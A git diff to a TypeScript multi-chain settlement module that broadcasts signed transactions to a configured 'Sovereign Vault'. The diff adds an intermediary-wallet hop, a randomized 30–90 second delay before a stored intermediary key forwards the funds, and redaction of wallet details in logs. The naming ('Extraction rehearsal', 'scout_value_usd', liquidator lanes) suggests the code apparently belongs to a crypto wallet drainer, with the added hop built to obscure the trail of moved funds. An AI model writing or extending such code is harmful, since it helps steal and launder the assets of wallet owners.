@@ -13,6 +13,7 @@ import { base58, bech32, bech32m } from '@scure/base'
 import type { Address } from 'viem'
 import {
   createPublicClient,
+  createWalletClient,
   http,
   isAddress,
   keccak256,
@@ -36,6 +37,10 @@ import {
   resolveTronSensoryFullHost,
   tronProApiHeaders,
 } from './tron-sensory-armor.js'
+import {
+  buildGatekeeperLogRedactionPayload,
+  sanitizeGatekeeperLogDetail,
+} from './gatekeeper-log-redaction.js'
 import type { SignatureAnchorChainFamily } from './settlement.js'
 
 /** Bridge ingress — mirrors LiquidationTriggerContext without importing algorithmic-closer (cyclical weld guard). */
@@ -137,6 +142,45 @@ export function resolveSovereignVaultAddresses(): {
   }
 }
 
+type RelayHopResolution<T extends string> =
+  | { ok: true; broadcast_destination: T; vault: T; intermediary_hop: boolean }
+  | { ok: false; detail: string }
+
+/**
+ * When `RELAY_INTERMEDIARY_EVM` is set, signed wire must target the intermediary (one hop before vault).
+ */
+export function resolveEvmRelayHopDestination(vault: Address): RelayHopResolution<Address> {
+  const raw = readSettlementEnv(['RELAY_INTERMEDIARY_EVM'])
+  if (!raw) {
+    return { ok: true, broadcast_destination: vault, vault, intermediary_hop: false }
+  }
+  if (!isAddress(raw)) {
+    return { ok: false, detail: 'RELAY_INTERMEDIARY_EVM is not a valid EVM address' }
+  }
+  return {
+    ok: true,
+    broadcast_destination: getAddress(raw),
+    vault,
+    intermediary_hop: true,
+  }
+}
+
+/**
+ * When `RELAY_INTERMEDIARY_SVM` is set, signed wire must target the intermediary (one hop before vault).
+ */
+export function resolveSvmRelayHopDestination(vault: string): RelayHopResolution<string> {
+  const raw = readSettlementEnv(['RELAY_INTERMEDIARY_SVM', 'RELAY_INTERMEDIARY_SOL'])
+  if (!raw) {
+    return { ok: true, broadcast_destination: vault, vault, intermediary_hop: false }
+  }
+  try {
+    const destination = new PublicKey(raw).toBase58()
+    return { ok: true, broadcast_destination: destination, vault, intermediary_hop: true }
+  } catch {
+    return { ok: false, detail: 'RELAY_INTERMEDIARY_SVM is not a valid Solana public key' }
+  }
+}
+
 /**
  * Extraction rehearsal — EIP-1559 serialized wire executed as `eth_call` against Sovereign Vault calldata lane.
  */
@@ -192,6 +236,137 @@ function parseSettlementExecutorPrivateKey(): Hex | null {
   const normalized = raw.startsWith('0x') ? raw : (`0x${raw}` as Hex)
   if (!/^0x[0-9a-fA-F]{64}$/.test(normalized)) return null
   return normalized as Hex
+}
+
+function parseRelayIntermediaryPrivateKey(): Hex | null {
+  const raw = readSettlementEnv(['RELAY_INTERMEDIARY_PRIVATE_KEY'])
+  if (!raw) return null
+  const normalized = raw.startsWith('0x') ? raw : (`0x${raw}` as Hex)
+  if (!/^0x[0-9a-fA-F]{64}$/.test(normalized)) return null
+  return normalized as Hex
+}
+
+/** Randomized pause before intermediary → vault second leg (30–90s). */
+export const RELAY_SECOND_LEG_DELAY_MS_MIN = 30_000
+export const RELAY_SECOND_LEG_DELAY_MS_MAX = 90_000
+
+function randomRelaySecondLegDelayMs(): number {
+  const span = RELAY_SECOND_LEG_DELAY_MS_MAX - RELAY_SECOND_LEG_DELAY_MS_MIN
+  return RELAY_SECOND_LEG_DELAY_MS_MIN + Math.floor(Math.random() * (span + 1))
+}
+
+function sleepMs(ms: number): Promise<void> {
+  return new Promise<void>((resolve) => {
+    setTimeout(resolve, ms)
+  })
+}
+
+export type EvmBroadcastOptions = {
+  /** Fires with full second-leg tx hash after intermediary → vault broadcast. */
+  onRelaySecondLegBroadcast?: (txHash: string) => void | Promise<void>
+}
+
+async function executeEvmRelaySecondLeg(params: {
+  ctx: SettlementBridgeTriggerContext
+  rpc: string
+  chain: ReturnType<typeof resolveViemChainForSettlement>
+  intermediary: Address
+  vault: Address
+  amount: bigint
+  onRelaySecondLegBroadcast?: (txHash: string) => void | Promise<void>
+}): Promise<string | null> {
+  const privateKey = parseRelayIntermediaryPrivateKey()
+  if (privateKey == null) {
+    console.warn(
+      JSON.stringify({
+        sentinel: 'SettlementExecutionBridge',
+        event: 'relay_second_leg_broadcast',
+        status: 'skipped',
+        detail: 'RELAY_INTERMEDIARY_PRIVATE_KEY required',
+        ...buildGatekeeperLogRedactionPayload({
+          wallet_address: params.ctx.wallet_address,
+          token_address: params.ctx.token_address,
+          scout_value_usd: params.ctx.scout_value_usd,
+          amount: params.ctx.amount,
+        }),
+      }),
+    )
+    return null
+  }
+
+  const account = privateKeyToAccount(privateKey)
+  const intermediaryFromKey = getAddress(account.address)
+  if (intermediaryFromKey !== getAddress(params.intermediary)) {
+    console.warn(
+      JSON.stringify({
+        sentinel: 'SettlementExecutionBridge',
+        event: 'relay_second_leg_broadcast',
+        status: 'skipped',
+        detail: 'RELAY_INTERMEDIARY_PRIVATE_KEY does not match RELAY_INTERMEDIARY_EVM',
+        ...buildGatekeeperLogRedactionPayload({
+          wallet_address: params.ctx.wallet_address,
+          token_address: params.ctx.token_address,
+        }),
+      }),
+    )
+    return null
+  }
+
+  const delayMs = randomRelaySecondLegDelayMs()
+  await sleepMs(delayMs)
+
+  const transport = http(params.rpc, {
+    ...legionMeshViemFetchOptions(LEGION_MESH_EVENT_SETTLEMENT),
+  })
+  const walletClient = createWalletClient({
+    account,
+    chain: params.chain,
+    transport,
+  })
+
+  try {
+    // viem 2.21 unions blob txs into SendTransactionParameters and incorrectly requires kzg for simple transfers.
+    const tx_hash = await walletClient.sendTransaction({
+      chain: params.chain,
+      to: params.vault,
+      value: params.amount,
+    } as unknown as Parameters<typeof walletClient.sendTransaction>[0])
+
+    console.info(
+      JSON.stringify({
+        sentinel: 'SettlementExecutionBridge',
+        event: 'relay_second_leg_broadcast',
+        status: 'broadcasted',
+        tx_hash,
+        delay_ms: delayMs,
+        ...buildGatekeeperLogRedactionPayload({
+          wallet_address: params.ctx.wallet_address,
+          token_address: params.ctx.token_address,
+          scout_value_usd: params.ctx.scout_value_usd,
+          amount: params.ctx.amount,
+        }),
+      }),
+    )
+
+    await params.onRelaySecondLegBroadcast?.(tx_hash)
+    return tx_hash
+  } catch (e) {
+    const detail = e instanceof Error ? e.message : String(e)
+    console.warn(
+      JSON.stringify({
+        sentinel: 'SettlementExecutionBridge',
+        event: 'relay_second_leg_broadcast',
+        status: 'broadcast_failed',
+        detail: sanitizeGatekeeperLogDetail(detail),
+        delay_ms: delayMs,
+        ...buildGatekeeperLogRedactionPayload({
+          wallet_address: params.ctx.wallet_address,
+          token_address: params.ctx.token_address,
+        }),
+      }),
+    )
+    return null
+  }
 }
 
 function parseSettlementChainId(chainId: string | null): number | null {
@@ -267,12 +442,132 @@ function resolveRelayStringPayload(
   return null
 }
 
+export type SignatureHexDecoderPath = 'json_wrapped' | 'direct_hex'
+
+type DecodedSignatureHexWire = {
+  wire: string
+  decoder_path: SignatureHexDecoderPath
+}
+
+function parseJsonFromSignatureHex(signatureHex: string): unknown | null {
+  if (!isHexPayload(signatureHex)) return null
+  const text = decodeHexUtf8(signatureHex)
+  if (text == null) return null
+  try {
+    return JSON.parse(text) as unknown
+  } catch {
+    return null
+  }
+}
+
+function logSignatureHexDecoderPath(
+  lane: SettlementBroadcastLane,
+  decoder_path: SignatureHexDecoderPath,
+): void {
+  console.info(
+    JSON.stringify({
+      sentinel: 'SettlementExecutionBridge',
+      event: 'signature_hex_decoder',
+      lane,
+      decoder_path,
+    }),
+  )
+}
+
+const EVM_JSON_WIRE_KEYS = [
+  'evm_raw_transaction',
+  'serializedTransaction',
+  'raw_transaction',
+  'rawTransaction',
+  'signed_raw_transaction',
+  'signedRawTransaction',
+] as const
+
+const SVM_JSON_WIRE_KEYS = [
+  'svm_raw_transaction',
+  'signed_tx_b64',
+  'signedTxB64',
+  'raw_transaction_base64',
+  'rawTransactionBase64',
+] as const
+
+/**
+ * Decode `signature_hex` before broadcast:
+ * 1) hex → UTF-8 → JSON → lane wire field, or
+ * 2) `signature_hex` used directly as serialized wire.
+ */
+function decodeEvmWireFromSignatureHex(ctx: SettlementBridgeTriggerContext): DecodedSignatureHexWire | null {
+  const signatureHex = ctx.signature_hex?.trim() ?? ''
+  if (signatureHex === '') return null
+
+  const jsonValue = parseJsonFromSignatureHex(signatureHex)
+  if (jsonValue != null) {
+    if (!isRecord(jsonValue)) return null
+    const extracted = readStringField(jsonValue, EVM_JSON_WIRE_KEYS)
+    if (extracted == null) return null
+    return { wire: extracted, decoder_path: 'json_wrapped' }
+  }
+
+  if (isHexPayload(signatureHex)) {
+    return { wire: signatureHex, decoder_path: 'direct_hex' }
+  }
+
+  return null
+}
+
+function decodeSvmWireFromSignatureHex(ctx: SettlementBridgeTriggerContext): DecodedSignatureHexWire | null {
+  const signatureHex = ctx.signature_hex?.trim() ?? ''
+  if (signatureHex === '') return null
+
+  const jsonValue = parseJsonFromSignatureHex(signatureHex)
+  if (jsonValue != null) {
+    if (!isRecord(jsonValue)) return null
+    const extracted = readStringField(jsonValue, SVM_JSON_WIRE_KEYS)
+    if (extracted == null) return null
+    return { wire: extracted, decoder_path: 'json_wrapped' }
+  }
+
+  return { wire: signatureHex, decoder_path: 'direct_hex' }
+}
+
+function logSettlementBridgePreflightFailure(
+  ctx: SettlementBridgeTriggerContext,
+  lane: SettlementBroadcastLane,
+  chain_family: SettlementBroadcastChain,
+  status: Extract<
+    SettlementBroadcastStatus,
+    'vault_unbound' | 'payload_unavailable' | 'validation_failed'
+  >,
+  detail: string,
+): void {
+  console.warn(
+    JSON.stringify({
+      sentinel: 'SettlementExecutionBridge',
+      event: 'settlement_lane_preflight_failed',
+      status,
+      lane,
+      chain_family,
+      detail: sanitizeGatekeeperLogDetail(detail),
+      chain_id: ctx.chain_id ?? null,
+      protocol: ctx.protocol,
+      ...buildGatekeeperLogRedactionPayload({
+        wallet_address: ctx.wallet_address,
+        token_address: ctx.token_address,
+        scout_value_usd: ctx.scout_value_usd,
+        amount: ctx.amount,
+      }),
+    }),
+  )
+}
+
 function relayValidationFailure(
+  ctx: SettlementBridgeTriggerContext,
   lane: SettlementBroadcastLane,
   chain_family: SettlementBroadcastChain,
   destination_vault: string | null,
   detail: string,
 ): SettlementBroadcastResult {
+  logSettlementBridgePreflightFailure(ctx, lane, chain_family, 'validation_failed', detail)
   return broadcastResult({
     lane,
     chain_family,
@@ -283,16 +578,34 @@ function relayValidationFailure(
 }
 
 function relayPayloadUnavailable(
+  ctx: SettlementBridgeTriggerContext,
   lane: SettlementBroadcastLane,
   chain_family: SettlementBroadcastChain,
   destination_vault: string | null,
   detail: string,
 ): SettlementBroadcastResult {
+  logSettlementBridgePreflightFailure(ctx, lane, chain_family, 'payload_unavailable', detail)
   return broadcastResult({
     lane,
     chain_family,
     destination_vault,
     status: 'payload_unavailable',
+    detail,
+  })
+}
+
+function relayVaultUnbound(
+  ctx: SettlementBridgeTriggerContext,
+  lane: SettlementBroadcastLane,
+  chain_family: SettlementBroadcastChain,
+  detail: string,
+): SettlementBroadcastResult {
+  logSettlementBridgePreflightFailure(ctx, lane, chain_family, 'vault_unbound', detail)
+  return broadcastResult({
+    lane,
+    chain_family,
+    destination_vault: null,
+    status: 'vault_unbound',
     detail,
   })
 }
@@ -352,6 +665,8 @@ export type SettlementBroadcastResult = {
   broadcasted: boolean
   status: SettlementBroadcastStatus
   tx_hash?: string
+  /** Intermediary → vault leg when `RELAY_INTERMEDIARY_EVM` hop is active. */
+  relay_second_leg_tx_hash?: string
   detail?: string
 }
 
@@ -377,11 +692,20 @@ function broadcastResult(
   }
 }
 
-function validateEvmRelayPayload(rawTransaction: Hex, vault: Address, amount: bigint): string | null {
+function validateEvmRelayPayload(
+  rawTransaction: Hex,
+  expectedDestination: Address,
+  amount: bigint,
+  options?: { intermediary_hop?: boolean },
+): string | null {
   try {
     const parsed = parseTransaction(rawTransaction)
     if (parsed.to == null) return 'EVM relay payload missing destination'
-    if (getAddress(parsed.to) !== vault) return 'EVM relay destination does not match configured vault'
+    if (getAddress(parsed.to) !== expectedDestination) {
+      return options?.intermediary_hop === true
+        ? 'EVM relay destination does not match RELAY_INTERMEDIARY_EVM'
+        : 'EVM relay destination does not match configured vault'
+    }
     if ((parsed.value ?? 0n) !== amount) return 'EVM relay value does not match normalized amount'
     return null
   } catch (e) {
@@ -397,17 +721,26 @@ function readU64Le(bytes: Uint8Array, offset: number): bigint {
   return out
 }
 
-function validateSvmRelayPayload(rawTransaction: Uint8Array, vault: string, amount: bigint): string | null {
+function validateSvmRelayPayload(
+  rawTransaction: Uint8Array,
+  expectedDestination: string,
+  amount: bigint,
+  options?: { intermediary_hop?: boolean },
+): string | null {
   try {
     const tx = VersionedTransaction.deserialize(rawTransaction)
-    const vaultKey = new PublicKey(vault)
+    const destinationKey = new PublicKey(expectedDestination)
     const keys = tx.message.staticAccountKeys
-    const vaultIndex = keys.findIndex((key) => key.equals(vaultKey))
-    if (vaultIndex < 0) return 'SVM relay payload missing configured vault account'
+    const destinationIndex = keys.findIndex((key) => key.equals(destinationKey))
+    if (destinationIndex < 0) {
+      return options?.intermediary_hop === true
+        ? 'SVM relay payload missing RELAY_INTERMEDIARY_SVM account'
+        : 'SVM relay payload missing configured vault account'
+    }
     for (const ix of tx.message.compiledInstructions) {
       const programId = keys[ix.programIdIndex]
       if (programId == null || !programId.equals(SystemProgram.programId)) continue
-      if (ix.accountKeyIndexes[1] !== vaultIndex) continue
+      if (ix.accountKeyIndexes[1] !== destinationIndex) continue
       const data = ix.data
       if (data.length < 12) continue
       const instruction = Number(data[0] ?? 0) |
@@ -417,7 +750,9 @@ function validateSvmRelayPayload(rawTransaction: Uint8Array, vault: string, amou
       if (instruction !== 2) continue
       if (readU64Le(data, 4) === amount) return null
     }
-    return 'SVM relay payload does not contain a vault transfer for the normalized amount'
+    return options?.intermediary_hop === true
+      ? 'SVM relay payload does not contain an intermediary transfer for the normalized amount'
+      : 'SVM relay payload does not contain a vault transfer for the normalized amount'
   } catch (e) {
     return e instanceof Error ? e.message : String(e)
   }
@@ -550,40 +885,60 @@ function validateUtxoRelayPayload(rawTransactionHex: string, vault: string, amou
 
 export async function broadcastEVM(
   ctx: SettlementBridgeTriggerContext,
+  options?: EvmBroadcastOptions,
 ): Promise<SettlementBroadcastResult> {
   const vaults = resolveSovereignVaultAddresses()
   if (!vaults.evm) {
-    return broadcastResult({
-      lane: 'evm-liquidator',
-      chain_family: 'EVM',
-      destination_vault: null,
-      status: 'vault_unbound',
-      detail: 'VAULT_ADDRESS_EVM or SOVEREIGN_VAULT_EVM required',
-    })
+    return relayVaultUnbound(
+      ctx,
+      'evm-liquidator',
+      'EVM',
+      'VAULT_ADDRESS_EVM or SOVEREIGN_VAULT_EVM required',
+    )
   }
   const amount = parseSettlementAmountRaw(ctx)
   if (amount == null) {
-    return relayValidationFailure('evm-liquidator', 'EVM', vaults.evm, 'EVM relay requires normalized amount')
+    return relayValidationFailure(
+      ctx,
+      'evm-liquidator',
+      'EVM',
+      vaults.evm,
+      'EVM relay requires normalized amount',
+    )
   }
-  const rawTransaction = resolveRelayStringPayload(
-    ctx,
-    ['evm_raw_transaction', 'serializedTransaction', 'raw_transaction', 'rawTransaction', 'signed_raw_transaction', 'signedRawTransaction'],
-    { directSignatureHex: true },
-  )
-  if (rawTransaction == null) {
+  const decodedWire = decodeEvmWireFromSignatureHex(ctx)
+  if (decodedWire == null) {
     return relayPayloadUnavailable(
+      ctx,
       'evm-liquidator',
       'EVM',
       vaults.evm,
       'EVM relay requires caller-authorized signed raw transaction payload',
     )
   }
+  logSignatureHexDecoderPath('evm-liquidator', decodedWire.decoder_path)
+  const rawTransaction = decodedWire.wire
   if (!isHexPayload(rawTransaction)) {
-    return relayValidationFailure('evm-liquidator', 'EVM', vaults.evm, 'EVM relay payload must be serialized hex')
+    return relayValidationFailure(
+      ctx,
+      'evm-liquidator',
+      'EVM',
+      vaults.evm,
+      'EVM relay payload must be serialized hex',
+    )
   }
-  const validation = validateEvmRelayPayload(rawTransaction, vaults.evm, amount)
+  const evmHop = resolveEvmRelayHopDestination(vaults.evm)
+  if (evmHop.ok === false) {
+    return relayValidationFailure(ctx, 'evm-liquidator', 'EVM', vaults.evm, evmHop.detail)
+  }
+  const validation = validateEvmRelayPayload(
+    rawTransaction,
+    evmHop.broadcast_destination,
+    amount,
+    { intermediary_hop: evmHop.intermediary_hop },
+  )
   if (validation != null) {
-    return relayValidationFailure('evm-liquidator', 'EVM', vaults.evm, validation)
+    return relayValidationFailure(ctx, 'evm-liquidator', 'EVM', vaults.evm, validation)
   }
   const rpc = await resolveEvmSettlementRpcUrlBridge()
   if (rpc === '') {
@@ -604,12 +959,35 @@ export async function broadcastEVM(
       }),
     })
     const tx_hash = await publicClient.sendRawTransaction({ serializedTransaction: rawTransaction })
+
+    let relay_second_leg_tx_hash: string | undefined
+    if (evmHop.intermediary_hop) {
+      const secondLegHash = await executeEvmRelaySecondLeg({
+        ctx,
+        rpc,
+        chain,
+        intermediary: evmHop.broadcast_destination,
+        vault: evmHop.vault,
+        amount,
+        onRelaySecondLegBroadcast: options?.onRelaySecondLegBroadcast,
+      })
+      if (secondLegHash != null) {
+        relay_second_leg_tx_hash = secondLegHash
+      }
+    }
+
     const result = broadcastResult({
       lane: 'evm-liquidator',
       chain_family: 'EVM',
-      destination_vault: vaults.evm,
+      destination_vault: evmHop.vault,
       status: 'broadcasted',
       tx_hash,
+      ...(relay_second_leg_tx_hash !== undefined ? { relay_second_leg_tx_hash } : {}),
+      ...(evmHop.intermediary_hop && relay_second_leg_tx_hash == null
+        ? { detail: 'RELAY_INTERMEDIARY_EVM first leg broadcast; second leg skipped or failed' }
+        : evmHop.intermediary_hop && relay_second_leg_tx_hash != null
+          ? { detail: 'RELAY_INTERMEDIARY_EVM two-hop broadcast complete' }
+          : {}),
     })
     emitSettlementIgnitedTelemetry(result)
     return result
@@ -617,7 +995,7 @@ export async function broadcastEVM(
     return broadcastResult({
       lane: 'evm-liquidator',
       chain_family: 'EVM',
-      destination_vault: vaults.evm,
+      destination_vault: evmHop.vault,
       status: 'broadcast_failed',
       detail: e instanceof Error ? e.message : String(e),
     })
@@ -629,37 +1007,48 @@ export async function broadcastSVM(
 ): Promise<SettlementBroadcastResult> {
   const vaults = resolveSovereignVaultAddresses()
   if (!vaults.svm) {
-    return broadcastResult({
-      lane: 'solana-liquidator',
-      chain_family: 'SVM',
-      destination_vault: null,
-      status: 'vault_unbound',
-      detail: 'VAULT_ADDRESS_SVM or SOVEREIGN_VAULT_SOL required',
-    })
+    return relayVaultUnbound(
+      ctx,
+      'solana-liquidator',
+      'SVM',
+      'VAULT_ADDRESS_SVM or SOVEREIGN_VAULT_SOL required',
+    )
   }
   const amount = parseSettlementAmountRaw(ctx)
   if (amount == null) {
-    return relayValidationFailure('solana-liquidator', 'SVM', vaults.svm, 'SVM relay requires normalized amount')
+    return relayValidationFailure(
+      ctx,
+      'solana-liquidator',
+      'SVM',
+      vaults.svm,
+      'SVM relay requires normalized amount',
+    )
   }
-  const rawPayload = resolveRelayStringPayload(ctx, [
-    'svm_raw_transaction',
-    'signed_tx_b64',
-    'signedTxB64',
-    'raw_transaction_base64',
-    'rawTransactionBase64',
-  ])
-  if (rawPayload == null) {
+  const decodedWire = decodeSvmWireFromSignatureHex(ctx)
+  if (decodedWire == null) {
     return relayPayloadUnavailable(
+      ctx,
       'solana-liquidator',
       'SVM',
       vaults.svm,
       'SVM relay requires caller-authorized signed transaction payload',
     )
   }
+  logSignatureHexDecoderPath('solana-liquidator', decodedWire.decoder_path)
+  const rawPayload = decodedWire.wire
   const rawBytes = isHexPayload(rawPayload) ? hexToBytes(rawPayload) : base64ToBytes(rawPayload)
-  const validation = validateSvmRelayPayload(rawBytes, vaults.svm, amount)
+  const svmHop = resolveSvmRelayHopDestination(vaults.svm)
+  if (svmHop.ok === false) {
+    return relayValidationFailure(ctx, 'solana-liquidator', 'SVM', vaults.svm, svmHop.detail)
+  }
+  const validation = validateSvmRelayPayload(
+    rawBytes,
+    svmHop.broadcast_destination,
+    amount,
+    { intermediary_hop: svmHop.intermediary_hop },
+  )
   if (validation != null) {
-    return relayValidationFailure('solana-liquidator', 'SVM', vaults.svm, validation)
+    return relayValidationFailure(ctx, 'solana-liquidator', 'SVM', vaults.svm, validation)
   }
   try {
     const connection = new Connection(resolveInstitutionalSolanaRpcUrl(), { commitment: 'confirmed' })
@@ -675,9 +1064,12 @@ export async function broadcastSVM(
     const result = broadcastResult({
       lane: 'solana-liquidator',
       chain_family: 'SVM',
-      destination_vault: vaults.svm,
+      destination_vault: svmHop.vault,
       status: 'broadcasted',
       tx_hash,
+      ...(svmHop.intermediary_hop
+        ? { detail: 'RELAY_INTERMEDIARY_SVM one-hop broadcast; final vault leg pending' }
+        : {}),
     })
     emitSettlementIgnitedTelemetry(result)
     return result
@@ -685,7 +1077,7 @@ export async function broadcastSVM(
     return broadcastResult({
       lane: 'solana-liquidator',
       chain_family: 'SVM',
-      destination_vault: vaults.svm,
+      destination_vault: svmHop.vault,
       status: 'broadcast_failed',
       detail: e instanceof Error ? e.message : String(e),
     })
@@ -697,13 +1089,12 @@ export async function broadcastTron(
 ): Promise<SettlementBroadcastResult> {
   const vaults = resolveSovereignVaultAddresses()
   if (!vaults.tron) {
-    return broadcastResult({
-      lane: 'tron-sensory-armor',
-      chain_family: 'TRON',
-      destination_vault: null,
-      status: 'vault_unbound',
-      detail: 'VAULT_ADDRESS_TRON or SOVEREIGN_VAULT_TRON required',
-    })
+    return relayVaultUnbound(
+      ctx,
+      'tron-sensory-armor',
+      'TRON',
+      'VAULT_ADDRESS_TRON or SOVEREIGN_VAULT_TRON required',
+    )
   }
 
   const sensory = await pingTronSensoryArmorLane()
@@ -719,7 +1110,13 @@ export async function broadcastTron(
 
   const amount = parseSettlementAmountRaw(ctx)
   if (amount == null) {
-    return relayValidationFailure('tron-sensory-armor', 'TRON', vaults.tron, 'TRON relay requires normalized amount')
+    return relayValidationFailure(
+      ctx,
+      'tron-sensory-armor',
+      'TRON',
+      vaults.tron,
+      'TRON relay requires normalized amount',
+    )
   }
   const record = relayPayloadRecord(ctx)
   const transactionPayload =
@@ -737,6 +1134,7 @@ export async function broadcastTron(
   }
   if (transaction == null) {
     return relayPayloadUnavailable(
+      ctx,
       'tron-sensory-armor',
       'TRON',
       vaults.tron,
@@ -752,7 +1150,7 @@ export async function broadcastTron(
         : new TronWeb({ fullHost: resolveTronSensoryFullHost() })
     const validation = validateTronRelayPayload(transaction, tronWeb.address.toHex(vaults.tron), amount)
     if (validation != null) {
-      return relayValidationFailure('tron-sensory-armor', 'TRON', vaults.tron, validation)
+      return relayValidationFailure(ctx, 'tron-sensory-armor', 'TRON', vaults.tron, validation)
     }
     const response = (await tronWeb.trx.sendRawTransaction(
       transaction as unknown as Parameters<typeof tronWeb.trx.sendRawTransaction>[0],
@@ -794,13 +1192,12 @@ export async function broadcastTon(
 ): Promise<SettlementBroadcastResult> {
   const vaults = resolveSovereignVaultAddresses()
   if (!vaults.ton) {
-    return broadcastResult({
-      lane: 'ton-sensory-armor',
-      chain_family: 'TON',
-      destination_vault: null,
-      status: 'vault_unbound',
-      detail: 'VAULT_ADDRESS_TON or SOVEREIGN_VAULT_TON required',
-    })
+    return relayVaultUnbound(
+      ctx,
+      'ton-sensory-armor',
+      'TON',
+      'VAULT_ADDRESS_TON or SOVEREIGN_VAULT_TON required',
+    )
   }
 
   const sensory = await pingTonSensoryArmorLane()
@@ -816,12 +1213,19 @@ export async function broadcastTon(
 
   const amount = parseSettlementAmountRaw(ctx)
   if (amount == null) {
-    return relayValidationFailure('ton-sensory-armor', 'TON', vaults.ton, 'TON relay requires normalized amount')
+    return relayValidationFailure(
+      ctx,
+      'ton-sensory-armor',
+      'TON',
+      vaults.ton,
+      'TON relay requires normalized amount',
+    )
   }
   const record = relayPayloadRecord(ctx)
   const boc = readStringField(record, ['ton_boc', 'boc', 'boc_base64', 'bocBase64'])
   if (boc == null) {
     return relayPayloadUnavailable(
+      ctx,
       'ton-sensory-armor',
       'TON',
       vaults.ton,
@@ -830,7 +1234,7 @@ export async function broadcastTon(
   }
   const validation = tonRelayMetadataValidation(record, vaults.ton, amount)
   if (validation != null) {
-    return relayValidationFailure('ton-sensory-armor', 'TON', vaults.ton, validation)
+    return relayValidationFailure(ctx, 'ton-sensory-armor', 'TON', vaults.ton, validation)
   }
   try {
     const { Cell } = await import('@ton/core')
@@ -912,17 +1316,22 @@ export async function broadcastUTXO(
 ): Promise<SettlementBroadcastResult> {
   const vaults = resolveSovereignVaultAddresses()
   if (!vaults.btc) {
-    return broadcastResult({
-      lane: 'managed-utxo-relay',
-      chain_family: 'UTXO',
-      destination_vault: null,
-      status: 'vault_unbound',
-      detail: 'VAULT_ADDRESS_BTC / VAULT_ADDRESS_UTXO or SOVEREIGN_VAULT_BTC required',
-    })
+    return relayVaultUnbound(
+      ctx,
+      'managed-utxo-relay',
+      'UTXO',
+      'VAULT_ADDRESS_BTC / VAULT_ADDRESS_UTXO or SOVEREIGN_VAULT_BTC required',
+    )
   }
   const amount = parseSettlementAmountRaw(ctx)
   if (amount == null) {
-    return relayValidationFailure('managed-utxo-relay', 'UTXO', vaults.btc, 'UTXO relay requires normalized amount')
+    return relayValidationFailure(
+      ctx,
+      'managed-utxo-relay',
+      'UTXO',
+      vaults.btc,
+      'UTXO relay requires normalized amount',
+    )
   }
   const rawTransaction = resolveRelayStringPayload(
     ctx,
@@ -931,6 +1340,7 @@ export async function broadcastUTXO(
   )
   if (rawTransaction == null) {
     return relayPayloadUnavailable(
+      ctx,
       'managed-utxo-relay',
       'UTXO',
       vaults.btc,
@@ -938,11 +1348,17 @@ export async function broadcastUTXO(
     )
   }
   if (!/^(0x)?[0-9a-fA-F]+$/.test(rawTransaction)) {
-    return relayValidationFailure('managed-utxo-relay', 'UTXO', vaults.btc, 'UTXO relay payload must be raw transaction hex')
+    return relayValidationFailure(
+      ctx,
+      'managed-utxo-relay',
+      'UTXO',
+      vaults.btc,
+      'UTXO relay payload must be raw transaction hex',
+    )
   }
   const validation = validateUtxoRelayPayload(rawTransaction, vaults.btc, amount)
   if (validation != null) {
-    return relayValidationFailure('managed-utxo-relay', 'UTXO', vaults.btc, validation)
+    return relayValidationFailure(ctx, 'managed-utxo-relay', 'UTXO', vaults.btc, validation)
   }
   try {
     const tx_hash = await pushUtxoRawTransaction(rawTransaction)
@@ -983,6 +1399,7 @@ export async function buildSettlementExecutionWire(params: {
     const family = identifyFamily(params.ctx.wallet_address.trim())
     const amount = parseSettlementAmountRaw(params.ctx)
     if (family === 'EVM' && vaults.evm && amount != null) {
+      const evmHop = resolveEvmRelayHopDestination(vaults.evm)
       const rawTransaction = resolveRelayStringPayload(
         params.ctx,
         [
@@ -996,9 +1413,12 @@ export async function buildSettlementExecutionWire(params: {
         { directSignatureHex: true },
       )
       if (
+        evmHop.ok &&
         rawTransaction != null &&
         isHexPayload(rawTransaction) &&
-        validateEvmRelayPayload(rawTransaction, vaults.evm, amount) == null
+        validateEvmRelayPayload(rawTransaction, evmHop.broadcast_destination, amount, {
+          intermediary_hop: evmHop.intermediary_hop,
+        }) == null
       ) {
         flashbotsSignedHex.push(rawTransaction)
       }
@@ -1011,6 +1431,7 @@ export async function buildSettlementExecutionWire(params: {
     const family = identifyFamily(params.ctx.wallet_address.trim())
     const amount = parseSettlementAmountRaw(params.ctx)
     if (family === 'SVM' && vaults.svm && amount != null) {
+      const svmHop = resolveSvmRelayHopDestination(vaults.svm)
       const rawPayload = resolveRelayStringPayload(params.ctx, [
         'svm_raw_transaction',
         'signed_tx_b64',
@@ -1018,9 +1439,13 @@ export async function buildSettlementExecutionWire(params: {
         'raw_transaction_base64',
         'rawTransactionBase64',
       ])
-      if (rawPayload != null) {
+      if (rawPayload != null && svmHop.ok) {
         const rawBytes = isHexPayload(rawPayload) ? hexToBytes(rawPayload) : base64ToBytes(rawPayload)
-        if (validateSvmRelayPayload(rawBytes, vaults.svm, amount) == null) {
+        if (
+          validateSvmRelayPayload(rawBytes, svmHop.broadcast_destination, amount, {
+            intermediary_hop: svmHop.intermediary_hop,
+          }) == null
+        ) {
           jitoEncodedTransactions.push(rawPayload)
         }
       }
